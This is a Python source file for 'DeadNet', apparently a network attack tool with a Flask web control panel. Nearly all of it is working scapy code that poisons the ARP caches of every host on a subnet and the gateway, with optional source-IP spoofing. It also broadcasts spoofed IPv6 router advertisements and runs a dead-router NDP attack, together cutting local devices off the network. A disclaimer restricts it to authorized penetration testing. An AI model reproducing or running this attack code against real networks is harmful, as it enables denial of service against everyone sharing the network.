#!/usr/bin/env python3
"""
DeadNet - Network Security Testing Tool
WARNING: This tool is for authorized penetration testing only.
Unauthorized use is illegal and unethical.
"""

import logging
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS

# Suppress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from utils import *

conf.verb = 0

app = Flask(__name__, template_folder='web/templates', static_folder='web/static')
CORS(app)

# Global attack state
attack_state = {
    'active': False,
    'mode': None,
    'interface': None,
    'attacks_enabled': {
        'arp_poison': True,
        'ipv6_ra': True,
        'dead_router': True
    },
    'statistics': {
        'cycles': 0,
        'packets_sent': 0,
        'start_time': None,
        'last_cycle_duration': 0
    },
    'network_info': {},
    'logs': []
}

attack_lock = threading.Lock()
attack_thread = None
current_attacker = None


class DeadNetAttacker:
    """Main attack orchestrator with concurrent attack execution"""
    
    def __init__(self, iface, cidrlen, interval, gateway_ipv4, gateway_mac, 
                 disable_ipv6, ipv6_preflen, mode='local', fake_ip=None):
        self.network_interface = iface
        self.arp_poison_interval = interval
        self.ipv6_preflen = ipv6_preflen or IPV6_PREFLEN
        self.mode = mode
        
        # Fake/Spoof settings
        self.fake_ip = fake_ip
        
        conf.iface = self.network_interface
        self.cidrlen_ipv4 = cidrlen
        self.spoof_ipv6ra = not disable_ipv6
        
        # Get network configuration
        self.user_ipv4 = get_if_addr(self.network_interface)
        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidrlen_ipv4}"
        
        # Get gateway information
        self.gateway_ipv4 = gateway_ipv4 or get_gateway_ipv4(self.network_interface)
        if not self.gateway_ipv4:
            raise Exception(f"{RED}[!]{WHITE} Unable to detect gateway IPv4 address")
        
        self.gateway_mac = gateway_mac or get_gateway_mac(self.gateway_ipv4, self.network_interface)
        if not self.gateway_mac:
            raise Exception(f"{RED}[-]{WHITE} Unable to retrieve gateway MAC address")
        elif not is_valid_mac(self.gateway_mac):
            raise Exception(f"{RED}[-]{WHITE} Invalid gateway MAC address: {self.gateway_mac}")
        
        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
        
        # Generate target hosts
        exclude_ips = [self.user_ipv4, self.gateway_ipv4]
        self.host_ipv4s = generate_host_ips(self.subnet_ipv4_sr, exclude_ips)
        
        self.log(f"{BLUE}[*]{WHITE} Generated {len(self.host_ipv4s)} possible IPv4 hosts")
        
        if self.spoof_ipv6ra:
            self.log(f"{BLUE}[*]{WHITE} IPv6 RA spoof is enabled")
            if not os_is_windows():
                ipv6_hosts = ping_ipv6_subnet(self.network_interface)
                self.log(f"{BLUE}[+]{WHITE} Found {len(ipv6_hosts)} IPv6 hosts")
            else:
                self.log(f"{YELLOW}[!]{WHITE} Windows detected, skipping IPv6 host discovery")
        
        self.abort = False
        self.print_settings()
    
    def log(self, message):
        """Add log message to attack state"""
        with attack_lock:
            attack_state['logs'].append({
                'timestamp': time.time(),
                'message': message
            })
            # Keep only last 100 logs
            if len(attack_state['logs']) > 100:
                attack_state['logs'] = attack_state['logs'][-100:]
        printf(message)
    
    def print_settings(self):
        """Display attack configuration"""
        self.log(DELIM)
        self.log("- Network Mode" + self.mode.upper().rjust(35))
        self.log("- Net Interface" + self.network_interface.rjust(35))
        self.log("- Sleep Interval" + str(self.arp_poison_interval).rjust(31) + " [sec]")
        self.log("- MAC Gateway" + self.gateway_mac.rjust(37))
        self.log("- IPv4 Subnet" + self.subnet_ipv4_sr.rjust(37))
        self.log("- IPv4 Gateway" + self.gateway_ipv4.rjust(36))
        self.log("- IPv6 Gateway" + self.gateway_ipv6.rjust(36))
        self.log("- IPv6 Preflen" + str(self.ipv6_preflen).rjust(36))
        self.log("- Spoof IPv6 RA" + str(self.spoof_ipv6ra).rjust(35))
        if self.fake_ip:
            self.log("- Fake Source IP" + self.fake_ip.rjust(34))
        self.log(DELIM)
    
    def poison_arp_single_host(self, host_ip):
        """Poison ARP cache for a single host"""
        try:
            # Use random MAC for spoofing
            spoof_mac = RandMAC()
            
            # Use fake_ip if provided, otherwise use target's IP
            # This makes the attack appear to come from fake_ip instead of real targets
            source_ip = self.fake_ip if self.fake_ip else host_ip
            
            # Poison gateway's ARP cache
            # Tell gateway: "source_ip is at spoof_mac"
            arp_packet_gateway = ARP(
                op=2, 
                psrc=source_ip,  # Using fake IP here if set
                hwdst=self.gateway_mac, 
                hwsrc=spoof_mac,
                pdst=self.gateway_ipv4
            )
            sendp(Ether() / arp_packet_gateway, iface=self.network_interface, verbose=0)
            
            # Poison host's ARP cache
            # Tell host: "gateway is at spoof_mac"
            arp_packet_host = ARP(
                op=2, 
                psrc=self.gateway_ipv4, 
                hwsrc=spoof_mac, 
                pdst=host_ip
            )
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, 
                  iface=self.network_interface, verbose=0)
            
            return 2  # 2 packets sent
        except Exception:
            return 0
    
    def poison_arp(self):
        """Execute ARP poisoning attack concurrently"""
        if not attack_state['attacks_enabled']['arp_poison']:
            return 0
        
        packets_sent = 0
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(self.poison_arp_single_host, self.host_ipv4s)
            packets_sent = sum(results)
        
        return packets_sent
    
    def poison_ra(self):
        """Execute IPv6 RA poisoning attack"""
        if not attack_state['attacks_enabled']['ipv6_ra']:
            return 0
        
        try:
            rand_mac = RandMAC()
            spoofed_mc_ra = (
                Ether(src=rand_mac) /
                IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) /
                ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) /
                ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) /
                ICMPv6NDOptMTU() /
                ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
            )
            sendp(spoofed_mc_ra, iface=self.network_interface, verbose=0)
            return 1
        except Exception:
            return 0
    
    def dead_router_attack(self):
        """Monitor and kill default router advertisements"""
        if not attack_state['attacks_enabled']['dead_router']:
            return
        
        try:
            NDP_Attack_Kill_Default_Router(iface=self.network_interface)
        except Exception as e:
            self.log(f"{RED}[!]{WHITE} Dead router attack error: {e}")
    
    def start_attack(self):
        """Main attack loop - runs all attacks concurrently"""
        self.log(DELIM)
        self.log(f"{GREEN}[+]{WHITE} Attack started!")
        self.log(DELIM)
        
        # Start dead router attack in background if IPv6 enabled
        if self.spoof_ipv6ra and attack_state['attacks_enabled']['dead_router']:
            threading.Thread(target=self.dead_router_attack, daemon=True).start()
        
        with attack_lock:
            attack_state['statistics']['start_time'] = time.time()
        
        while not self.abort:
            try:
                cycle_start = get_ts_ms()
                packets_sent = 0
                
                # Run attacks concurrently
                with ThreadPoolExecutor(max_workers=3) as executor:
                    futures = []
                    
                    # Submit ARP poisoning
                    futures.append(executor.submit(self.poison_arp))
                    
                    # Submit IPv6 RA poisoning
                    if self.spoof_ipv6ra:
                        futures.append(executor.submit(self.poison_ra))
                    
                    # Wait for all attacks to complete
                    for future in futures:
                        try:
                            result = future.result(timeout=30)
                            packets_sent += result if result else 0
                        except Exception as e:
                            self.log(f"{RED}[!]{WHITE} Attack error: {e}")
                
                cycle_duration = get_ts_ms() - cycle_start
                
                # Update statistics
                with attack_lock:
                    attack_state['statistics']['cycles'] += 1
                    attack_state['statistics']['packets_sent'] += packets_sent
                    attack_state['statistics']['last_cycle_duration'] = cycle_duration
                
                self.log(
                    f"{GREEN}[+]{WHITE} Cycle #{attack_state['statistics']['cycles']} - "
                    f"{packets_sent} packets - {cycle_duration}ms"
                )
                
                time.sleep(self.arp_poison_interval)
                
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as exc:
                self.log(f"{RED}[!]{WHITE} Exception: {exc}")
                self.log(traceback.format_exc())
                break
        
        self.log(f"{RED}[-]{WHITE} Attack stopped")
    
    def stop(self):
        """Stop the attack"""
        self.abort = True


# ============================================================================
# Web API Endpoints
# ============================================================================

@app.route('/')
def index():
    """Serve the web control panel"""
    return render_template('index.html')


@app.route('/api/status', methods=['GET'])
def get_status():
    """Get current attack status"""
    with attack_lock:
        status = {
            'active': attack_state['active'],
            'mode': attack_state['mode'],
            'interface': attack_state['interface'],
            'attacks_enabled': attack_state['attacks_enabled'].copy(),
            'statistics': attack_state['statistics'].copy(),
            'network_info': attack_state['network_info'].copy()
        }
    return jsonify(status)


@app.route('/api/logs', methods=['GET'])
def get_logs():
    """Get recent log entries"""
    limit = request.args.get('limit', 50, type=int)
    with attack_lock:
        logs = attack_state['logs'][-limit:]
    return jsonify({'logs': logs})


@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    """Get available network interfaces"""
    interfaces = get_network_interfaces()
    return jsonify({'interfaces': interfaces})


@app.route('/api/start', methods=['POST'])
def start_attack():
    """Start the attack"""
    global attack_thread
    
    data = request.json
    iface = data.get('interface')
    mode = data.get('mode', 'local')
    cidrlen = data.get('cidrlen', 24)
    interval = data.get('interval', 5)
    disable_ipv6 = not data.get('enable_ipv6', True)
    fake_ip = data.get('fake_ip')
    
    if not iface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    
    with attack_lock:
        if attack_state['active']:
            return jsonify({'success': False, 'error': 'Attack already running'}), 400
        
        attack_state['active'] = True
        attack_state['mode'] = mode
        attack_state['interface'] = iface
        attack_state['statistics'] = {
            'cycles': 0,
            'packets_sent': 0,
            'start_time': None,
            'last_cycle_duration': 0
        }
        attack_state['logs'] = []
    
    def run_attack():
        global attack_thread, current_attacker
        try:
            current_attacker = DeadNetAttacker(
                iface=iface,
                cidrlen=cidrlen,
                interval=interval,
                gateway_ipv4=None,
                gateway_mac=None,
                disable_ipv6=disable_ipv6,
                ipv6_preflen=64,
                mode=mode,
                fake_ip=fake_ip
            )
            
            # Store network info
            with attack_lock:
                attack_state['network_info'] = {
                    'interface': current_attacker.network_interface,
                    'ip': current_attacker.user_ipv4,
                    'user_ipv4': current_attacker.user_ipv4,
                    'gateway': current_attacker.gateway_ipv4,
                    'gateway_ipv4': current_attacker.gateway_ipv4,
                    'gateway_mac': current_attacker.gateway_mac,
                    'mac': current_attacker.gateway_mac,
                    'subnet': current_attacker.subnet_ipv4_sr,
                    'target_hosts': len(current_attacker.host_ipv4s),
                    'fake_ip': current_attacker.fake_ip
                }
            
            current_attacker.start_attack()
        except Exception as e:
            with attack_lock:
                attack_state['active'] = False
                attack_state['logs'].append({
                    'timestamp': time.time(),
                    'message': f"{RED}[!]{WHITE} Error: {str(e)}"
                })
        finally:
            with attack_lock:
                attack_state['active'] = False
    
    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()
    
    return jsonify({'success': True, 'message': 'Attack started'})


@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """Stop the attack"""
    global current_attacker
    
    with attack_lock:
        if not attack_state['active']:
            return jsonify({'success': False, 'error': 'No attack running'}), 400
        
        attack_state['active'] = False
    
    # Stop the attacker thread
    if current_attacker:
        current_attacker.stop()
        current_attacker = None
    
    return jsonify({'success': True, 'message': 'Attack stopped'})


@app.route('/api/toggle_attack', methods=['POST'])
def toggle_attack():
    """Toggle specific attack type"""
    data = request.json
    attack_type = data.get('attack_type')
    enabled = data.get('enabled', True)
    
    if attack_type not in attack_state['attacks_enabled']:
        return jsonify({'success': False, 'error': 'Invalid attack type'}), 400
    
    with attack_lock:
        attack_state['attacks_enabled'][attack_type] = enabled
    
    return jsonify({'success': True, 'message': f'Attack {attack_type} {"enabled" if enabled else "disabled"}'})


if __name__ == '__main__':
    print(f"\n{BANNER}")
    print("Written by @flashnuke | Optimized for Windows")
    print(DELIM)
    
    if not is_admin():
        print(f"{RED}[!]{WHITE} This tool requires administrator privileges!")
        print(f"{YELLOW}[!]{WHITE} Please run as administrator")
        input("Press Enter to exit...")
        exit(1)
    
    print(f"{GREEN}[+]{WHITE} Starting web control panel...")
    print(f"{BLUE}[*]{WHITE} Access the control panel at: http://localhost:5000")
    print(DELIM)
    print(f"\n{YELLOW}{'!' * 49}{WHITE}")
    print(f"{YELLOW}WARNING: This tool is for authorized penetration testing ONLY!")
    print(f"Unauthorized network attacks are ILLEGAL and UNETHICAL.")
    print(f"Use responsibly and only on networks you own or have permission to test.{WHITE}")
    print(f"{YELLOW}{'!' * 49}{WHITE}\n")
    print(f"{BLUE}[*]{WHITE} Service is online, Open your web browser and access the control panel at http://localhost:5000")
    
    # Suppress Flask startup messages and request logs
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
